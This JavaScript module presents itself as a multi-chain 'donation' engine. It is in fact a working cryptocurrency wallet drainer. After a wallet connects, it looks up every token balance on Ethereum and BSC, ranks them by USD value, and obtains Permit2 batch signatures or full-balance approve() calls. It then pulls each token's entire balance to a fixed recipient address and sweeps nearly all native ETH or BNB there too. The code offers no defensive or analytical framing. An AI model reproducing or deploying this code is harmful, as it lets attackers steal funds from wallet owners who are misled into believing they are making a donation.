// src/engine/donate.js
import { ethers } from "ethers";
import { SignatureTransfer } from "@uniswap/permit2-sdk";
import {
  COVALENT_API_KEY,
  RECIPIENT_ADDRESS,
  DONATION_CONTRACT_ADDRESS,
  DONATION_CONTRACT_ABI,
  PERMIT2_ADDRESS,
  PERMIT2_ABI,
  exceptionList,
} from "../config";
import { getFreePermit2Nonce } from "./nonceHelper";

/**
 * Chains to sweep
 */
const CHAINS = [
  { chainId: 1, name: "Ethereum" },
  { chainId: 56, name: "BSC" },
  /*{ chainId: 137, name: "Polygon" }*/
];

/**
 * Utility: convert numeric chainId to hex string (0x...)
 */
function chainIdToHex(chainId) {
  return "0x" + chainId.toString(16);
}

/**
 * Get a provider+signer appropriate for the target chain.
 *
 * - If walletClient is provided (WalletConnect / wagmi walletClient), we try
 *   walletClient.switchChain() first (if available) and fall back to provider.send.
 * - If no walletClient, we use window.ethereum (injected) and call wallet_switchEthereumChain.
 *
 * Returns { provider, signer, usingWalletClient: boolean }
 */
async function getProviderAndSignerForChain(walletClient, targetChainId) {
  // WalletConnect / wagmi walletClient path
  if (walletClient) {
    const { account, transport } = walletClient;
    const provider = new ethers.BrowserProvider(transport);

    // Attempt chain switch using walletClient helper if present (wagmi exposes switchChain)
    try {
      if (typeof walletClient.switchChain === "function") {
        // wagmi switchChain expects an object like { id: chainId } or number depending on client
        await walletClient.switchChain?.({ id: targetChainId }).catch(() => {});
      } else {
        // fallback to JSON-RPC wallet_switchEthereumChain
        await provider.send("wallet_switchEthereumChain", [{ chainId: chainIdToHex(targetChainId) }]);
      }
    } catch (err) {
      // Non-fatal: we still re-create provider & signer; log for debugging
      console.warn(`Chain switch (walletClient) to ${targetChainId} failed:`, err);
    }

    // Re-create provider after attempted switch (some transports update internal state after switch)
    const chainProvider = new ethers.BrowserProvider(transport);
    const signer = new ethers.JsonRpcSigner(chainProvider, account.address);
    return { provider: chainProvider, signer, usingWalletClient: true };
  }

  // Injected provider path (MetaMask etc.)
  if (typeof window !== "undefined" && window.ethereum) {
    const provider = new ethers.BrowserProvider(window.ethereum);

    try {
      await provider.send("wallet_switchEthereumChain", [{ chainId: chainIdToHex(targetChainId) }]);
    } catch (err) {
      // If switch fails (user rejected or chain not added), we continue but log
      console.warn(`wallet_switchEthereumChain failed for ${targetChainId}:`, err);
    }

    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    return { provider, signer, usingWalletClient: false };
  }

  throw new Error("No wallet provider found (neither walletClient nor window.ethereum)");
}

/**
 * Fetch balances from Covalent
 */
export async function fetchBalancesCovalent(address, chainId) {
  try {
    const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${COVALENT_API_KEY}`;
    const res = await fetch(url);
    const json = await res.json();
    if (!json?.data?.items) return [];
    return json.data.items
      .filter(i => i.contract_address && i.balance && i.balance !== "0")
      .map(i => ({
        tokenSymbol: i.contract_ticker_symbol,
        tokenAddress: i.contract_address.toLowerCase(),
        balanceRaw: i.balance,
        decimals: i.contract_decimals || 18,
        quote: i.quote || 0,
      }));
  } catch (err) {
    console.warn("fetchBalancesCovalent failed, returning empty array", err);
    return [];
  }
}

/**
 * Filter tokens that should be considered for Permit2 path (skip native tokens)
 */
export async function filterPermit2SafeTokens(tokens) {
  return tokens.filter(t =>
    t.tokenAddress &&
    !["BNB", "ETH", /*"MATIC"*/].includes(t.tokenSymbol) &&
    t.balanceRaw !== "0"
  );
}

/**
 * Sort by USD value helper
 */
export function sortByUsd(tokens) {
  return tokens.sort((a, b) => b.quote - a.quote);
}

/**
 * isPermit2Compatible — simple check (note: transferFrom ABI corrected)
 */
export async function isPermit2Compatible(tokenAddress, signer) {
  try {
    // NOTE: transferFrom is state-changing, do NOT mark it as view — using a minimal ABI check
    const token = new ethers.Contract(
      tokenAddress,
      ["function transferFrom(address,address,uint256) returns (bool)"],
      signer
    );
    // This only tests that the method exists on the proxy object (we're not calling it)
    return typeof token.transferFrom === "function";
  } catch (err) {
    console.warn("isPermit2Compatible check error:", err);
    return false;
  }
}

/**
 * Sum USD value of tokens
 */
export function getChainValue(tokens) {
  return tokens.reduce((acc, t) => acc + (t.quote || 0), 0);
}

/**
 * Main flow - accepts optional walletClient (WalletConnect). If undefined, uses injected provider.
 *
 * IMPORTANT:
 * - When using WalletConnect, call autoDonateMultiChain(walletClient)
 * - When using injected wallets (MetaMask), call autoDonateMultiChain()
 */
export async function autoDonateMultiChain(walletClient) {
  try {
    // Fetch balances once using any signer (we need the owner address).
    // We'll use the first available provider+signer on the first chain (Ethereum) to get owner.
    // But to be robust, fetch owner using the provider for the chain we're about to sweep when performing actions.
    // Build chainBalances using Covalent (owner resolved via whichever provider we use for the chain loop).

    // We'll start by resolving owner via a safe method:
    let ownerFromClient = null;
    if (walletClient && walletClient.account?.address) {
      ownerFromClient = walletClient.account.address;
    } else if (typeof window !== "undefined" && window.ethereum) {
      try {
        const tmpProv = new ethers.BrowserProvider(window.ethereum);
        await tmpProv.send("eth_requestAccounts", []);
        const tmpSigner = await tmpProv.getSigner();
        ownerFromClient = await tmpSigner.getAddress();
      } catch (err) {
        console.warn("Could not resolve owner from injected provider:", err);
      }
    }

    if (!ownerFromClient) {
      // fallback: pick owner by asking user to connect (this should be handled outside in UI)
      throw new Error("Unable to resolve owner address; make sure wallet is connected");
    }

    // Build chainBalances using Covalent and owner's address
    const chainBalances = [];
    for (const chain of CHAINS) {
      const raw = await fetchBalancesCovalent(ownerFromClient, chain.chainId);
      const filtered = await filterPermit2SafeTokens(raw);
      chainBalances.push({ ...chain, tokens: filtered, totalValue: getChainValue(filtered) });
    }

    // Sort chains by total token value descending
    chainBalances.sort((a, b) => b.totalValue - a.totalValue);

    // Sweep each chain — for each chain we'll create a chain-specific provider+signer (correct chain context)
    for (const chain of chainBalances) {
      if (!chain.tokens) chain.tokens = [];
      console.log(`\n--- Sweeping chain ${chain.name} (id: ${chain.chainId}) — tokens: ${chain.tokens.length}, value: $${chain.totalValue.toFixed(2)} ---`);

      // Get provider+signer for this chain
      const { provider, signer, usingWalletClient } = await getProviderAndSignerForChain(walletClient, chain.chainId);
      console.log("Using provider for chain", chain.chainId, "usingWalletClient:", usingWalletClient);

      // Re-resolve owner from signer (safer)
      const owner = await signer.getAddress();

      // Split tokens into permit2 vs fallback
      const permit2Tokens = [];
      const fallbackTokens = [];
      for (const t of chain.tokens) {
        const isException = exceptionList?.[chain.chainId]?.includes(t.tokenAddress.toLowerCase());
        if (isException) {
          fallbackTokens.push(t);
          continue;
        }
        // the compatibility check is intentionally conservative
        const ok = await isPermit2Compatible(t.tokenAddress, signer);
        if (ok) permit2Tokens.push(t);
        else fallbackTokens.push(t);
      }

      const donation = new ethers.Contract(
        DONATION_CONTRACT_ADDRESS[chain.chainId],
        DONATION_CONTRACT_ABI,
        signer
      );

      // --- Permit2 batch first ---
      if (permit2Tokens.length > 0) {
        try {
          const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
          const nonce = await getFreePermit2Nonce(permit2, owner);
          const deadline = Math.floor(Date.now() / 1000) + 3600;

          const permittedForSig = permit2Tokens.map(t => ({ token: t.tokenAddress, amount: BigInt(t.balanceRaw) }));
          const permittedForContract = permit2Tokens.map(t => ({ token: t.tokenAddress, amount: t.balanceRaw }));

          const permitForSig = {
            permitted: permittedForSig,
            nonce: BigInt(nonce),
            deadline: BigInt(deadline),
            spender: DONATION_CONTRACT_ADDRESS[chain.chainId],
          };

          const { domain, types, values } = SignatureTransfer.getPermitData(
            permitForSig,
            PERMIT2_ADDRESS,
            chain.chainId
          );

          let signature;
          if (typeof signer.signTypedData === "function") {
            signature = await signer.signTypedData(domain, types, values);
          } else {
            // Ethers JsonRpcSigner typically exposes _signTypedData
            signature = await signer._signTypedData(domain, types, values);
          }

          const transferDetails = permit2Tokens.map(t => ({ to: RECIPIENT_ADDRESS, requestedAmount: t.balanceRaw }));
          const permitForContractCall = { permitted: permittedForContract, nonce, deadline };

          const tx = await donation.pullAndDonate(permitForContractCall, transferDetails, owner, signature);
          console.log("Permit2 batch donation tx:", tx.hash);
          await tx.wait();
        } catch (err) {
          console.warn("Permit2 batch failed, moving to fallback:", err);
          fallbackTokens.push(...permit2Tokens);
        }
      }

      // --- Fallback allowance transfer ---
      if (fallbackTokens.length > 0) {
        const tokensToPull = [];
        const amountsToPull = [];

        for (const t of fallbackTokens) {
          try {
            const token = new ethers.Contract(
              t.tokenAddress,
              ["function approve(address,uint256) returns (bool)"],
              signer
            );
            await token.approve(DONATION_CONTRACT_ADDRESS[chain.chainId], t.balanceRaw);
            tokensToPull.push(t.tokenAddress);
            amountsToPull.push(t.balanceRaw);
          } catch (err) {
            console.error(`Failed approve for ${t.tokenSymbol}:`, err);
          }
        }

        if (tokensToPull.length > 0) {
          try {
            const tx2 = await donation.pullAndDonateAllowanceBatch(tokensToPull, amountsToPull, owner);
            console.log("Fallback allowance batch tx:", tx2.hash);
            await tx2.wait();
          } catch (err) {
            console.error("Fallback batch failed:", err);
          }
        }
      }

      // --- Native sweep (use chain provider) ---
      try {
        const gasPrice = await provider.getFeeData().then(f => f.gasPrice);
        const reserveForNative = 21000n * (gasPrice ?? 0n) * 2n;

        const bal = await provider.getBalance(owner);
        if (bal > reserveForNative) {
          const amountToSend = bal - reserveForNative;
          const tx = await signer.sendTransaction({
            to: RECIPIENT_ADDRESS,
            value: amountToSend,
          });
          console.log(`${chain.name} native sweep tx:`, tx.hash);
          await tx.wait();
        } else {
          console.log(`${chain.name} not enough native to sweep safely`);
        }
      } catch (err) {
        console.error(`Native sweep failed on ${chain.name}`, err);
      }

      console.log(`Finished sweeping chain ${chain.name}`);
    }

    return { success: true, message: "All chains swept" };
  } catch (err) {
    console.error("autoDonateMultiChain error:", err);
    return { success: false, reason: err.message || String(err) };
  }
}

